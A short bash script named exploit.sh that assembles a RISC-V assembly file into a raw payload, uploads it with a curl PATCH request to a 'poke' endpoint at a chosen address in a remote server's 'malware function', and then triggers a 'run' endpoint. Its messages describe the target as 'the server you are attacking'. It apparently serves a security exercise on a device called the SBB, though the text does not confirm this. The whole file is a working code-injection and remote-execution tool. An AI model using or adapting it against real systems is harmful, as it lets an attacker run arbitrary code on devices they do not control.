#!/bin/bash

prefix=riscv32-unknown-elf-
tempDir=$(mktemp -d)

# This script assumes you will pass it exactly one argument
# It expects that arg to be a file which contains RISC-V assembly
# which it will write to the malware function

if [ -z $1 ]; then
	echo "Usage: exploit.sh FILE"
	echo "Exiting..."
	exit 1
fi

# This script assumes that there are 2 environment variables set:
# malware_start_addr (where to write to using the poke command)
# SBB_IP, the IP address of the SBB

if [ -z $SBB_IP ]; then
	echo "Error: No SBB_IP enivronment variable set."
	echo "Set this to the IP of the server you are attacking."
	echo "Exiting..."
	exit 1
fi

if [ -z $malware_start_addr ]; then
	echo "Error: No malware_start_addr enivronment variable set."
	echo "Set this to the address (in the malware function) you would like to write to."
	echo "Exiting..."
	exit 1
fi

${prefix}as -o "$tempDir/exploit.elf" "$1"
${prefix}objcopy -O binary --only-section=.text "$tempDir/exploit.elf" "$tempDir/payload.bin"
size=$(du -b "$tempDir/payload.bin" | cut -f 1)

curl -v --data-binary @"$tempDir/payload.bin" --request PATCH http://$SBB_IP/poke/$malware_start_addr/$size
curl -v http://$SBB_IP/run/0

echo "Done"
